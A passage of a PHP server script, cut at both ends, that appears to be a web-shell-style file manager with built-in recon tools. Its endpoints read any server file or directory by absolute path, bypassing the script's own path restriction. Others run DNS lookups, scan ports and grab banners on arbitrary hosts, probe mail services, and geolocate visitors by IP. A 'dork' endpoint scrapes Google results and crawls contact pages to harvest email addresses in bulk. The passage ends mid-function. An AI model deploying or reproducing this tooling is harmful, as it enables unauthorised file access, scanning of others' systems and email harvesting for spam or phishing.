        try { @chmod($trashLog, 0666); } catch (Throwable $e) {}
        echo json_encode(['success'=>true,'removed'=>['ts'=>$ts,'type'=>$type,'name'=>$name,'path'=>$path]]);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false,'error'=>'server_error']);
    }
    exit;
}
if (!function_exists('get_client_ip')) { function get_client_ip(){ $keys=['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR']; $ip=''; foreach($keys as $k){ if(!empty($_SERVER[$k])){ $ip=$_SERVER[$k]; break; } } if(!empty($ip)){ $ip=explode(',', $ip)[0]; $ip=trim($ip); } return $ip; } }
if (!function_exists('curl_get_json')) { function curl_get_json($url,$timeoutConnect=2,$timeoutTotal=3,$headers=array()){ if(function_exists('curl_init')){ $ch=curl_init($url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeoutConnect); curl_setopt($ch,CURLOPT_TIMEOUT,$timeoutTotal); if(!empty($headers)){ curl_setopt($ch,CURLOPT_HTTPHEADER,$headers); } $resp=curl_exec($ch); curl_close($ch); if($resp){ $d=json_decode($resp,true); if(is_array($d)) return $d; } return null; } $ctx=stream_context_create(['http'=>['method'=>'GET','timeout'=>$timeoutTotal,'header'=>!empty($headers)?implode("\r\n",$headers):'', 'ignore_errors'=>true]]); $resp=@file_get_contents($url,false,$ctx); if($resp){ $d=json_decode($resp,true); if(is_array($d)) return $d; } return null; } }
if (!function_exists('get_country_flag')) { function get_country_flag($country_code){ $code=strtoupper(trim((string)$country_code)); if(preg_match('/^[A-Z]{2}$/',$code)){ $offset=127397; if(function_exists('mb_convert_encoding')){ $first=mb_convert_encoding('&#'.($offset+ord($code[0])).';','UTF-8','HTML-ENTITIES'); $second=mb_convert_encoding('&#'.($offset+ord($code[1])).';','UTF-8','HTML-ENTITIES'); return $first.$second; } if(function_exists('mb_chr')){ return mb_chr($offset+ord($code[0]),'UTF-8').mb_chr($offset+ord($code[1]),'UTF-8'); } } return ''; } }
if (!function_exists('get_geo_by_ip')) { function get_geo_by_ip($ip,$apiKey=null){ $out=['ip'=>$ip,'country'=>'','countryCode'=>'','city'=>'','flag'=>'']; if(!$ip) return $out; if($ip==='127.0.0.1'||$ip==='::1'){ $out['city']='Localhost'; return $out; } $d=curl_get_json('https://ipwho.is/'.urlencode($ip)); if($d && isset($d['success']) && $d['success']){ $out['country']=$d['country']??$out['country']; $out['countryCode']=$d['country_code']??$out['countryCode']; $out['city']=$d['city']??$out['city']; } if(empty($out['country'])||empty($out['countryCode'])||empty($out['city'])){ $d2=curl_get_json('http://ip-api.com/json/'.urlencode($ip).'?fields=status,country,countryCode,city'); if($d2 && isset($d2['status']) && $d2['status']==='success'){ $out['country']=$d2['country']??$out['country']; $out['countryCode']=$d2['countryCode']??$out['countryCode']; $out['city']=$d2['city']??$out['city']; } } if(empty($out['country'])||empty($out['countryCode'])||empty($out['city'])){ $d3=curl_get_json('https://ipapi.co/'.urlencode($ip).'/json/'); if($d3){ $out['country']=$d3['country_name']??($d3['country']??$out['country']); $out['countryCode']=$d3['country']??$out['countryCode']; $out['city']=$d3['city']??$out['city']; } } $apiKey=$apiKey?:getenv('IPDETECTIVE_API_KEY'); if($apiKey && (empty($out['country'])||empty($out['countryCode'])||empty($out['city']))){ $d4=curl_get_json('https://api.ipdetective.io/ip/'.urlencode($ip).'?info=true',3,6,['x-api-key: '.$apiKey,'Accept: application/json']); if($d4){ if(isset($d4['country'])){ $out['country']=$d4['country']['name']??($d4['country']['code']??$out['country']); $out['countryCode']=$d4['country']['code']??$out['countryCode']; } if(isset($d4['city'])){ $out['city']=$d4['city']['name']??$out['city']; } } } if(!empty($out['countryCode'])){ $out['flag']=get_country_flag($out['countryCode']); } return $out; } }
if (isset($_GET['api']) && $_GET['api'] === 'session_info') {
    header('Content-Type: application/json');
    $ip = (string)get_client_ip();
    if ($ip === '') { $ip = (string)($_SERVER['REMOTE_ADDR'] ?? ''); }
    $country = '';
    $code = '';
    $flag = '';
    if ($ip !== '') { $g = get_geo_by_ip($ip); if (is_array($g)) { $country = (string)($g['country'] ?? ''); $code = (string)($g['countryCode'] ?? ''); $flag = (string)($g['flag'] ?? ''); } }
    $since = isset($_SESSION['first_visit_ts']) ? (int)$_SESSION['first_visit_ts'] : 0;
    if ($since <= 0) { $since = time(); $_SESSION['first_visit_ts'] = $since; }
    $elapsed = max(0, time() - $since);
    $show = !isset($_SESSION['welcome_seen']) || $_SESSION['welcome_seen'] !== true;
    $_SESSION['welcome_seen'] = true;
    echo json_encode(['success'=>true,'ip'=>$ip,'country'=>$country,'code'=>$code,'flag'=>$flag,'since'=>$since,'elapsed'=>$elapsed,'show'=>$show]);
    exit;
}
// API: raw file content for editor (relative or absolute)
if (isset($_GET['api']) && $_GET['api'] === 'raw_content') {
    // Return plain text content for a file, used by the popup editor
    $path = null;
    if (!empty($_GET['d'])) {
        $path = safePath($BASE_DIR, (string)$_GET['d']);
    } elseif (!empty($_GET['os'])) {
        $real = realpath((string)$_GET['os']);
        if ($real !== false) { $path = $real; }
    }
    if ($path && is_file($path)) {
        header('Content-Type: text/plain; charset=UTF-8');
        $content = @file_get_contents($path);
        if ($content === false) { $content = ''; }
        echo $content;
    } else {
        header('Content-Type: text/plain; charset=UTF-8');
        http_response_code(404);
        echo '';
    }
    exit;
}
// API: ls -l style listing (relative or absolute directory)
if (isset($_GET['api']) && $_GET['api'] === 'ls') {
    header('Content-Type: text/plain; charset=UTF-8');
    $path = null;
    if (!empty($_GET['d'])) {
        $path = safePath($BASE_DIR, (string)$_GET['d']);
    } elseif (!empty($_GET['os'])) {
        $real = realpath((string)$_GET['os']);
        if ($real !== false) { $path = $real; }
    }
    if (!$path || !is_dir($path)) {
        http_response_code(400);
        echo "Invalid directory\n";
        exit;
    }
    $items = @scandir($path);
    if ($items === false) {
        echo "Cannot read directory\n";
        exit;
    }
    foreach ($items as $name) {
        if ($name === '.' || $name === '..') continue;
        $full = $path . DIRECTORY_SEPARATOR . $name;
        $perm = @fileperms($full);
        $isDir = is_dir($full);
        $isLink = is_link($full);
        $typeChar = $isDir ? 'd' : ($isLink ? 'l' : '-');
        // Permissions string similar to rwxrwxrwx with suid/sgid/sticky
        $owner_r = ($perm & 0x0100) ? 'r' : '-';
        $owner_w = ($perm & 0x0080) ? 'w' : '-';
        $owner_x = ($perm & 0x0040) ? (($perm & 0x0800) ? 's' : 'x') : (($perm & 0x0800) ? 'S' : '-');
        $group_r = ($perm & 0x0020) ? 'r' : '-';
        $group_w = ($perm & 0x0010) ? 'w' : '-';
        $group_x = ($perm & 0x0008) ? (($perm & 0x0400) ? 's' : 'x') : (($perm & 0x0400) ? 'S' : '-');
        $other_r = ($perm & 0x0004) ? 'r' : '-';
        $other_w = ($perm & 0x0002) ? 'w' : '-';
        $other_x = ($perm & 0x0001) ? (($perm & 0x0200) ? 't' : 'x') : (($perm & 0x0200) ? 'T' : '-');
        $permStr = $typeChar . $owner_r . $owner_w . $owner_x . $group_r . $group_w . $group_x . $other_r . $other_w . $other_x;
        $links = 1; // approximate; PHP doesn't provide portable hard link count
        $uid = @fileowner($full);
        $gid = @filegroup($full);
        $ownerName = function_exists('posix_getpwuid') ? ((@posix_getpwuid($uid)['name'] ?? (string)$uid)) : (string)$uid;
        $groupName = function_exists('posix_getgrgid') ? ((@posix_getgrgid($gid)['name'] ?? (string)$gid)) : (string)$gid;
        $size = @filesize($full);
        $mtime = @filemtime($full);
        $dateStr = $mtime ? date('M d H:i', $mtime) : '';
        echo sprintf("%s %3d %-8s %-8s %10d %s %s\n", $permStr, $links, $ownerName, $groupName, $size, $dateStr, $name);
    }
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'cwd') {
    header('Content-Type: application/json');
    $abs = (string)($_GET['os'] ?? '');
    $rel = (string)($_GET['d'] ?? '');
    $mode = '';
    $dirPath = null;
    if ($abs !== '') { $dirPath = realpath($abs); $mode = 'abs'; }
    else { $dirPath = safePath($BASE_DIR, $rel); $mode = 'rel'; }
    if (!$dirPath || !is_dir($dirPath)) { echo json_encode(['success'=>false,'error'=>'Invalid directory']); exit; }
    echo json_encode(['success'=>true,'cwd'=>$dirPath,'mode'=>$mode,'rel'=>$rel]);
    exit;
}
// API: nslookup — DNS records for a domain
if (isset($_GET['api']) && $_GET['api'] === 'nslookup') {
    header('Content-Type: application/json');
    $raw = trim((string)($_GET['domain'] ?? ''));
    $host = $raw;
    if ($host !== '') {
        $lower = strtolower($host);
        if (preg_match('/^https?:\/\//', $lower)) {
            $parts = @parse_url($lower);
            $host = (string)($parts['host'] ?? '');
        }
    }
    $host = preg_replace('/[^A-Za-z0-9.-]/', '', $host);
    if ($host === '' || strlen($host) > 253) { echo json_encode(['success'=>false,'error'=>'Invalid domain']); exit; }
    $out = [ 'success'=>true, 'domain'=>$host, 'a'=>[], 'aaaa'=>[], 'cname'=>'', 'ns'=>[], 'mx'=>[], 'txt'=>[], 'rdns'=>[], 'http_server'=>'' ];
    try { $ares = @dns_get_record($host, DNS_A); if (is_array($ares)) { foreach ($ares as $r) { $ip = (string)($r['ip'] ?? ''); if ($ip !== '') { $out['a'][] = $ip; } } } } catch (Throwable $e) {}
    try { $v6 = @dns_get_record($host, DNS_AAAA); if (is_array($v6)) { foreach ($v6 as $r) { $ip6 = (string)($r['ipv6'] ?? ''); if ($ip6 !== '') { $out['aaaa'][] = $ip6; } } } } catch (Throwable $e) {}
    try { $cn = @dns_get_record($host, DNS_CNAME); if (is_array($cn)) { foreach ($cn as $r) { $target = (string)($r['target'] ?? ''); if ($target !== '') { $out['cname'] = $target; break; } } } } catch (Throwable $e) {}
    try { $ns = @dns_get_record($host, DNS_NS); if (is_array($ns)) { foreach ($ns as $r) { $target = (string)($r['target'] ?? ''); if ($target !== '') { $out['ns'][] = $target; } } } } catch (Throwable $e) {}
    try { $mx = @dns_get_record($host, DNS_MX); if (is_array($mx)) { foreach ($mx as $r) { $target = (string)($r['target'] ?? ''); $pri = isset($r['pri']) ? (int)$r['pri'] : null; $out['mx'][] = [ 'host'=>$target, 'pri'=>$pri ]; } } } catch (Throwable $e) {}
    try { $txt = @dns_get_record($host, DNS_TXT); if (is_array($txt)) { foreach ($txt as $r) { $t = (string)($r['txt'] ?? ''); if ($t !== '') { $out['txt'][] = $t; } } } } catch (Throwable $e) {}
    foreach ($out['a'] as $ip) { $ptr = ''; try { $ptr = @gethostbyaddr($ip) ?: ''; } catch (Throwable $e) {} $out['rdns'][] = [ 'ip'=>$ip, 'ptr'=>$ptr ]; }
    $httpServer = '';
    try {
        $req = "HEAD / HTTP/1.1\r\nHost: " . $host . "\r\nConnection: close\r\n\r\n";
        $errno = 0; $errstr = '';
        $c = @stream_socket_client('tcp://' . $host . ':80', $errno, $errstr, 0.8);
        if (is_resource($c)) {
            @stream_set_blocking($c, true);
            @fwrite($c, $req);
            $buf = '';
            $r = [$c]; $w = null; $e = null;
            $ready = @stream_select($r, $w, $e, 0, 600000);
            if ($ready && is_array($r) && count($r) > 0) { $buf = (string)@fread($c, 2048); }
            @fclose($c);
            if ($buf !== '') {
                $lines = preg_split('/\r\n|\n|\r/', $buf);
                foreach ($lines as $ln) {
                    if (stripos($ln, 'Server:') === 0) { $httpServer = trim(substr($ln, 7)); break; }
                }
            }
        }
    } catch (Throwable $e) {}
    $out['http_server'] = $httpServer;
    echo json_encode($out);
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'portscan') {
    header('Content-Type: application/json');
    $raw = trim((string)($_GET['domain'] ?? ''));
    $host = $raw;
    if ($host !== '') {
        $lower = strtolower($host);
        if (preg_match('/^https?:\/\//', $lower)) {
            $parts = @parse_url($lower);
            $host = (string)($parts['host'] ?? '');
        }
    }
    $host = preg_replace('/[^A-Za-z0-9.-]/', '', $host);
    if ($host === '' || strlen($host) > 253) { echo json_encode(['success'=>false,'error'=>'Invalid domain']); exit; }
    $portsRaw = trim((string)($_GET['ports'] ?? ''));
    $ports = [];
    if ($portsRaw !== '') {
        foreach (explode(',', $portsRaw) as $p) {
            $n = (int)trim($p);
            if ($n >= 1 && $n <= 65535) { $ports[] = $n; }
        }
    }
    if (!count($ports)) {
        $ports = [21,22,25,53,80,110,143,443,465,587,993,995,3306,6379,8080,8443];
    }
    $ports = array_values(array_unique($ports));
    if (count($ports) > 32) { $ports = array_slice($ports, 0, 32); }
    $ips = [];
    try { $ares = @dns_get_record($host, DNS_A); if (is_array($ares)) { foreach ($ares as $r) { $ip = (string)($r['ip'] ?? ''); if ($ip !== '') { $ips[] = $ip; } } } } catch (Throwable $e) {}
    $results = [];
    foreach ($ports as $port) {
        $open = false;
        $banner = '';
        $errno = 0; $errstr = '';
        $timeout = 0.8;
        $conn = @stream_socket_client('tcp://' . $host . ':' . $port, $errno, $errstr, $timeout);
        if (is_resource($conn)) {
            $open = true;
            @stream_set_blocking($conn, true);
            $buf = '';
            $r = [$conn];
            $w = null; $e = null;
            $ready = @stream_select($r, $w, $e, 0, 400000);
            if ($ready && is_array($r) && count($r) > 0) { $buf = @fread($conn, 96); }
            if (is_string($buf) && $buf !== '') { $banner = trim(preg_replace('/\s+/', ' ', $buf)); }
            @fclose($conn);
        }
        $results[] = [ 'port'=>$port, 'open'=>$open, 'banner'=>$banner ];
    }
    echo json_encode([ 'success'=>true, 'domain'=>$host, 'ips'=>$ips, 'ports'=>$results ]);
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'portscan_range') {
    header('Content-Type: application/json');
    $raw = trim((string)($_GET['domain'] ?? ''));
    $host = $raw;
    if ($host !== '') {
        $lower = strtolower($host);
        if (preg_match('/^https?:\/\//', $lower)) {
            $parts = @parse_url($lower);
            $host = (string)($parts['host'] ?? '');
        }
    }
    $host = preg_replace('/[^A-Za-z0-9.-]/', '', $host);
    if ($host === '' || strlen($host) > 253) { echo json_encode(['success'=>false,'error'=>'Invalid domain']); exit; }
    $start = (int)($_GET['start'] ?? 1);
    $end = (int)($_GET['end'] ?? 1024);
    if ($start < 1) $start = 1;
    if ($end > 65535) $end = 65535;
    if ($end < $start) $end = $start;
    $span = $end - $start + 1;
    if ($span > 1024) { $end = $start + 1024 - 1; $span = 1024; }
    $ips = [];
    try { $ares = @dns_get_record($host, DNS_A); if (is_array($ares)) { foreach ($ares as $r) { $ip = (string)($r['ip'] ?? ''); if ($ip !== '') { $ips[] = $ip; } } } } catch (Throwable $e) {}
    $results = [];
    for ($p = $start; $p <= $end; $p++) {
        $open = false;
        $errno = 0; $errstr = '';
        $timeout = 0.06;
        $conn = @stream_socket_client('tcp://' . $host . ':' . $p, $errno, $errstr, $timeout);
        if (is_resource($conn)) { $open = true; @fclose($conn); }
        if ($open) { $results[] = [ 'port'=>$p, 'open'=>true ]; }
    }
    echo json_encode([ 'success'=>true, 'domain'=>$host, 'ips'=>$ips, 'start'=>$start, 'end'=>$end, 'ports'=>$results ]);
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'mailports') {
    header('Content-Type: application/json');
    $raw = trim((string)($_GET['domain'] ?? ''));
    $host = $raw;
    if ($host !== '') {
        $lower = strtolower($host);
        if (preg_match('/^https?:\/\//', $lower)) {
            $parts = @parse_url($lower);
            $host = (string)($parts['host'] ?? '');
        }
    }
    $host = preg_replace('/[^A-Za-z0-9.-]/', '', $host);
    if ($host === '' || strlen($host) > 253) { echo json_encode(['success'=>false,'error'=>'Invalid domain']); exit; }
    $defs = [
        ['port'=>993,'wrap'=>'ssl','service'=>'imap_ssl'],
        ['port'=>143,'wrap'=>'tcp','service'=>'imap'],
        ['port'=>995,'wrap'=>'ssl','service'=>'pop3_ssl'],
        ['port'=>110,'wrap'=>'tcp','service'=>'pop3'],
        ['port'=>465,'wrap'=>'ssl','service'=>'smtp_ssl'],
        ['port'=>587,'wrap'=>'tcp','service'=>'smtp'],
        ['port'=>2096,'wrap'=>'ssl','service'=>'webmail_https'],
        ['port'=>2095,'wrap'=>'tcp','service'=>'webmail_http'],
    ];
    $results = [];
    foreach ($defs as $d) {
        $port = (int)$d['port'];
        $wrap = (string)$d['wrap'];
        $service = (string)$d['service'];
        $open = false; $banner = '';
        $errno = 0; $errstr = '';
        $timeout = 0.8;
        $scheme = ($wrap === 'ssl') ? ('ssl://' . $host . ':' . $port) : ('tcp://' . $host . ':' . $port);
        $conn = @stream_socket_client($scheme, $errno, $errstr, $timeout);
        if (is_resource($conn)) {
            $open = true;
            @stream_set_blocking($conn, true);
            $buf = '';
            if ($service === 'webmail_http' || $service === 'webmail_https') {
                $req = "HEAD / HTTP/1.1\r\nHost: " . $host . "\r\nConnection: close\r\n\r\n";
                @fwrite($conn, $req);
            }
            $r = [$conn]; $w = null; $e = null;
            $ready = @stream_select($r, $w, $e, 0, 400000);
            if ($ready && is_array($r) && count($r) > 0) { $buf = @fread($conn, 256); }
            if (is_string($buf) && $buf !== '') { $banner = trim(preg_replace('/\s+/', ' ', $buf)); }
            @fclose($conn);
        }
        $results[] = [ 'port'=>$port, 'service'=>$service, 'open'=>$open, 'banner'=>$banner ];
    }
    echo json_encode([ 'success'=>true, 'domain'=>$host, 'ports'=>$results ]);
    exit;
}
// API: dork_emails — extract email addresses from Google dork results and top links
if (isset($_GET['api']) && $_GET['api'] === 'dork_emails') {
    header('Content-Type: application/json');
    $q = trim((string)($_GET['q'] ?? ''));
    if ($q === '') { echo json_encode(['success'=>false,'error'=>'query_required']); exit; }
    $pages = (int)($_GET['pages'] ?? 1);
    if ($pages < 1) $pages = 1; if ($pages > 10) $pages = 10;
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36';
    $timeout = 8;
    $emails = [];
    $sources = [];
    $visited = [];
    $resultLinks = [];
    $emailPattern = '/[A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/';
    $http_get = function(string $url) use ($ua, $timeout) {
        $body = '';
        if (function_exists('curl_init')) {
            $ch = @curl_init($url);
            if ($ch) {
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
                @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
                @curl_setopt($ch, CURLOPT_USERAGENT, $ua);
                @curl_setopt($ch, CURLOPT_HTTPHEADER, [ 'Accept-Language: en-US,en;q=0.8' ]);
                $resp = @curl_exec($ch);
                if (is_string($resp)) { $body = $resp; }
                @curl_close($ch);
            }
        }
        if ($body === '') {
            $ctx = @stream_context_create([
                'http' => [ 'method' => 'GET', 'timeout' => $timeout, 'header' => "User-Agent: $ua\r\nAccept-Language: en-US,en;q=0.8", 'ignore_errors' => true ],
                'ssl' => [ 'verify_peer' => false, 'verify_peer_name' => false ]
            ]);
            $resp = @file_get_contents($url, false, $ctx);
            if (is_string($resp)) { $body = $resp; }
        }
        return $body;
    };
    $extract_emails = function(string $text) use ($emailPattern) {
        $found = [];
        if ($text !== '') {
            $t = $text;
            $t = html_entity_decode($t, ENT_QUOTES, 'UTF-8');
            $t = preg_replace('/\s*\[?\(?at\)?\]?\s*/i', '@', $t);
            $t = preg_replace('/\s*(\[?dot\]?|\(dot\)|\s+dot\s+)\s*/i', '.', $t);
            if (@preg_match_all($emailPattern, $t, $m) && isset($m[0])) {
                foreach ($m[0] as $e) {
                    $e = (string)$e;
                    if ($e !== '') { $found[] = $e; }
                }
            }
        }
        if (count($found)) { $found = array_values(array_unique($found)); }
        return $found;
    };
    $paramUseApi = isset($_GET['use_api']) ? (string)$_GET['use_api'] : '';
    $apiKey = (string)(getenv('GOOGLE_API_KEY') ?: '');
    $cseId = (string)((getenv('GOOGLE_CX') ?: '') ?: (getenv('GOOGLE_CSE_ID') ?: ''));
    $paramKey = isset($_GET['key']) ? (string)$_GET['key'] : '';
    $paramCx  = isset($_GET['cx']) ? (string)$_GET['cx'] : '';
    if ($paramKey !== '') { $apiKey = $paramKey; }
    if ($paramCx  !== '') { $cseId = $paramCx; }
    $cfgFile = $SECURE_DIR . DIRECTORY_SEPARATOR . 'google_cse.json';
    if (($apiKey === '' || $cseId === '') && is_file($cfgFile)) {
        $rawCfg = (string)@file_get_contents($cfgFile);
        $jcfg = $rawCfg !== '' ? @json_decode($rawCfg, true) : null;
        if (is_array($jcfg)) {
            if ($apiKey === '' && !empty($jcfg['key'])) { $apiKey = (string)$jcfg['key']; }
            if ($cseId === '' && !empty($jcfg['cx'])) { $cseId = (string)$jcfg['cx']; }
        }
    }
    $useApi = ($paramUseApi === '1') || ($paramUseApi === '' && $apiKey !== '' && $cseId !== '');
    $usedApi = false;
    $apiErr = '';
    if ($useApi && $apiKey !== '' && $cseId !== '') {
        $perPage = 10;
        for ($i = 0; $i < $pages; $i++) {
            $start = ($i * $perPage) + 1;
            $apiUrl = 'https://www.googleapis.com/customsearch/v1?key=' . urlencode($apiKey) . '&cx=' . urlencode($cseId) . '&q=' . urlencode($q) . '&num=' . $perPage . '&start=' . $start;
            $jsonStr = $http_get($apiUrl);
            $j = @json_decode((string)$jsonStr, true);
            $usedApi = true;
            if (is_array($j) && isset($j['error'])) { $apiErr = (string)($j['error']['message'] ?? 'api_error'); }
            if (is_array($j) && isset($j['items']) && is_array($j['items'])) {
                foreach ($j['items'] as $it) {
                    $link = (string)($it['link'] ?? '');
                    if ($link === '' || isset($visited[$link])) { continue; }
                    $visited[$link] = true;
                    if (stripos($link, 'http') !== 0) { continue; }
                    $resultLinks[] = $link;
                    if (count($resultLinks) >= 24) { break; }
                }
            }
            if (count($resultLinks) >= 24) { break; }
        }
        if (count($resultLinks) === 0) {
            $start = 0;
            $url = 'https://www.google.com/search?q=' . urlencode($q) . '&num=10&start=' . $start . '&hl=en';
            $html = $http_get($url);
            if (is_string($html) && $html !== '') {
                $onPage = $extract_emails($html);
                foreach ($onPage as $e) { $emails[$e] = true; $sources[$e] = $sources[$e] ?? []; $sources[$e][] = 'search_page'; }
                if (@preg_match_all('/href=\"\/url\?q=([^&\"]+)/i', $html, $m) && isset($m[1])) {
                    foreach ($m[1] as $enc) {
                        $link = urldecode((string)$enc);
                        if ($link === '' || isset($visited[$link])) { continue; }
                        $visited[$link] = true;
                        if (stripos($link, 'http') !== 0) { continue; }
                        if (stripos($link, 'google') !== false) { continue; }
                        $resultLinks[] = $link;
                        if (count($resultLinks) >= 8) { break; }
                    }
                }
            }
        }
    } else {
        for ($i = 0; $i < $pages; $i++) {
            $start = $i * 10;
            $url = 'https://www.google.com/search?q=' . urlencode($q) . '&num=10&start=' . $start . '&hl=en';
            $html = $http_get($url);
            if (!is_string($html) || $html === '') { continue; }
            $onPage = $extract_emails($html);
            foreach ($onPage as $e) { $emails[$e] = true; $sources[$e] = $sources[$e] ?? []; $sources[$e][] = 'search_page'; }
            if (@preg_match_all('/href=\"\/url\?q=([^&\"]+)/i', $html, $m) && isset($m[1])) {
                foreach ($m[1] as $enc) {
                    $link = urldecode((string)$enc);
                    if ($link === '' || isset($visited[$link])) { continue; }
                    $visited[$link] = true;
                    if (stripos($link, 'http') !== 0) { continue; }
                    if (stripos($link, 'google') !== false) { continue; }
                    $resultLinks[] = $link;
                    if (count($resultLinks) >= 8) { break; }
                }
            }
            if (count($resultLinks) < 8 && @preg_match_all('/<a[^>]+href=\"(https?:[^\"]+)\"/i', $html, $m2) && isset($m2[1])) {
                foreach ($m2[1] as $href) {
                    $link = (string)$href;
                    if ($link === '' || isset($visited[$link])) { continue; }
                    $visited[$link] = true;
                    if (stripos($link, 'http') !== 0) { continue; }
                    if (stripos($link, 'google') !== false) { continue; }
                    $resultLinks[] = $link;
                    if (count($resultLinks) >= 12) { break; }
                }
            }
            if (@preg_match_all('/mailto:([A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/i', $html, $mm) && isset($mm[1])) {
                foreach ($mm[1] as $e) { $emails[(string)$e] = true; $sources[(string)$e] = $sources[(string)$e] ?? []; $sources[(string)$e][] = 'search_page_mailto'; }
            }
        }
    }
    
    $deep = (int)($_GET['deep'] ?? 0);
    if ($deep < 0) { $deep = 0; }
    if ($deep > 5) { $deep = 5; }
    $domainDeepCounts = [];
    foreach ($resultLinks as $lnk) {
        $body = $http_get($lnk);
        if (!is_string($body) || $body === '') { continue; }
        $found = $extract_emails($body);
        foreach ($found as $e) { $emails[$e] = true; $sources[$e] = $sources[$e] ?? []; $sources[$e][] = $lnk; }
        if (@preg_match_all('/mailto:([A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/i', $body, $mm2) && isset($mm2[1])) {
            foreach ($mm2[1] as $e2) { $emails[(string)$e2] = true; $sources[(string)$e2] = $sources[(string)$e2] ?? []; $sources[(string)$e2][] = $lnk; }
        }
        if (@preg_match('/"email"\s*:\s*"([^"]+)"/i', $body, $je) && isset($je[1])) {
            $jsonEmail = (string)$je[1]; $ex = $extract_emails($jsonEmail); foreach ($ex as $e3) { $emails[$e3] = true; $sources[$e3] = $sources[$e3] ?? []; $sources[$e3][] = $lnk; }
        }
        if ($deep > 0) {
            $parts = @parse_url($lnk);
            $host = is_array($parts) ? (string)($parts['host'] ?? '') : '';
            $scheme = is_array($parts) ? (string)($parts['scheme'] ?? 'https') : 'https';
            if ($host !== '') {
                if (!isset($domainDeepCounts[$host])) { $domainDeepCounts[$host] = 0; }
                $kw = ['contact','staff','people','team','directory','email','mail','about','support'];
                $cands = [];
                if (@preg_match_all('/<a[^>]+href="([^"]+)"/i', $body, $al) && isset($al[1])) {
                    foreach ($al[1] as $href) {
                        $u = (string)$href;
                        if ($u === '') continue;
                        if (strpos($u, 'mailto:') === 0) continue;
                        // make absolute
                        if (strpos($u, 'http') !== 0) {
                            $base = $scheme . '://' . $host;
                            if ($u[0] !== '/') { $u = $base . '/' . ltrim($u, './'); }
                            else { $u = $base . $u; }
                        }
                        $pu = @parse_url($u);
                        $h2 = is_array($pu) ? (string)($pu['host'] ?? '') : '';
                        if ($h2 !== $host) continue;
                        if (isset($visited[$u])) continue;
                        $low = strtolower($u);
                        $hit = false; for ($ki=0;$ki<count($kw);$ki++){ if (strpos($low, $kw[$ki]) !== false) { $hit = true; break; } }
                        if ($hit) { $cands[] = $u; }
                    }
                }
                foreach ($cands as $cu) {
                    if ($domainDeepCounts[$host] >= $deep) break;
                    $visited[$cu] = true;
                    $domainDeepCounts[$host]++;
                    $b2 = $http_get($cu);
                    if (!is_string($b2) || $b2 === '') continue;
                    $ex2 = $extract_emails($b2);
                    foreach ($ex2 as $e4) { $emails[$e4] = true; $sources[$e4] = $sources[$e4] ?? []; $sources[$e4][] = $cu; }
                    if (@preg_match_all('/mailto:([A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})/i', $b2, $mm3) && isset($mm3[1])) {
                        foreach ($mm3[1] as $em) { $emails[(string)$em] = true; $sources[(string)$em] = $sources[(string)$em] ?? []; $sources[(string)$em][] = $cu; }
                    }
                }
            }
        }
    }
    $list = array_keys($emails);
    $wantDomain = '';
    if (preg_match('/@([A-Za-z0-9.-]+\.[A-Za-z]{2,})/', $q, $dm) && isset($dm[1])) { $wantDomain = strtolower((string)$dm[1]); }
    if ($wantDomain !== '') { $list = array_values(array_filter($list, function($e) use ($wantDomain){ return stripos($e, '@'.$wantDomain) !== false; })); }
    $tldRaw = isset($_GET['tld']) ? (string)$_GET['tld'] : '';
    if ($tldRaw !== '') {
        $tlds = array_map('trim', explode(',', $tldRaw));
        $tlds = array_values(array_filter(array_map('strtolower', $tlds), function($s){ return $s !== ''; }));
        $tlds = array_map(function($s){ return ($s[0] === '.') ? $s : ('.' . $s); }, $tlds);
        $list = array_values(array_filter($list, function($e) use ($tlds){
            $at = strrpos($e, '@'); if ($at === false) return false; $dom = strtolower(substr($e, $at+1));
            foreach ($tlds as $suf) { if (substr($dom, -strlen($suf)) === $suf) return true; }
            return false;
        }));
    }
    sort($list);
    echo json_encode([ 'success' => true, 'query' => $q, 'emails' => $list, 'count' => count($list), 'used_api' => $usedApi, 'links' => count($resultLinks), 'pages' => $pages, 'deep' => $deep, 'api_error' => $apiErr ]);
    exit;
}
if (isset($_GET['api']) && $_GET['api'] === 'dork_emails_stream') {
    header('Content-Type: text/plain; charset=UTF-8');
    $q = trim((string)($_GET['q'] ?? ''));
    if ($q === '') { echo "DONE\n"; exit; }
    $pages = (int)($_GET['pages'] ?? 1);
    if ($pages < 1) $pages = 1; if ($pages > 3) $pages = 3;
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36';
    $timeout = 6;
    $emails = [];
    $sources = [];
    $visited = [];
    $resultLinks = [];
    $emailPattern = '/[A-Za-z0-9_.%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/';
    $http_get = function(string $url) use ($ua, $timeout) {
        $body = '';
        if (function_exists('curl_init')) { $ch = @curl_init($url); if ($ch) { @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); @curl_setopt($ch, CURLOPT_USERAGENT, $ua); @curl_setopt($ch, CURLOPT_HTTPHEADER, [ 'Accept-Language: en-US,en;q=0.8' ]); $resp = @curl_exec($ch); if (is_string($resp)) { $body = $resp; } @curl_close($ch); } }
